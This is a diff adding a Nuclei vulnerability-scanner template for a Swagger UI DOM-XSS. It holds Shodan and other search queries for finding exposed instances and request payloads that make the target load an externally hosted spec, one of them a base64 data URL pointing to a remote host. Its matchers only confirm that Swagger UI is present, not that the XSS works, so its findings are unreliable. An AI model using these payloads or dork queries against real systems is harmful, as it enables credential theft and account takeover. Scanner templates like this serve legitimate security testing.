@@ -1,0 +1,47 @@
+id: swagger-ui-xss-domain
+
+info:
+  name: Swagger UI DOM-XSS
+  author: rix4uni
+  severity: medium
+  description: Swagger UI DOM-XSS >=3.14.1 < 3.38.0
+  reference:
+    - https://medium.com/@M0X0101/how-i-was-able-to-steal-users-credentials-via-swagger-ui-dom-xss-e84255eb8c96
+    - https://www.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers
+  metadata:
+    google-query:
+      - intext:"Swagger UI" intitle:"Swagger UI"
+    shodan-query:
+      - http.title:"Swagger UI"
+      - http.favicon.hash:"1120729672,-1128940573,-1180440057,-1839822816,1065743122,698799942,-1107597998,1674630873,2079947712,-1022056073,-322615620,-557888293,-2135565029"
+      - http.component:"Swagger UI"
+    censys-query:
+      - services.http.response.html_title="Swagger UI"
+    fofa-query:
+      - title="Swagger UI"
+    hunter-query:
+      - web.title="Swagger UI"
+  tags: swagger
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?configUrl=https://raw.githubusercontent.com/rix4uni/swagger-xss/main/swagger.json"
+      - "{{BaseURL}}/?url=https://raw.githubusercontent.com/rix4uni/swagger-xss/main/swagger.yaml"
+      - "{{BaseURL}}/?configUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ=="
+
+    threads: 100
+    # stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "Swagger UI"
+          - "SwaggerUIBundle"
+          - 'swagger-ui.css">'
+          - 'id="swagger-ui"'
+
+      - type: status
+        status:
+          - 200
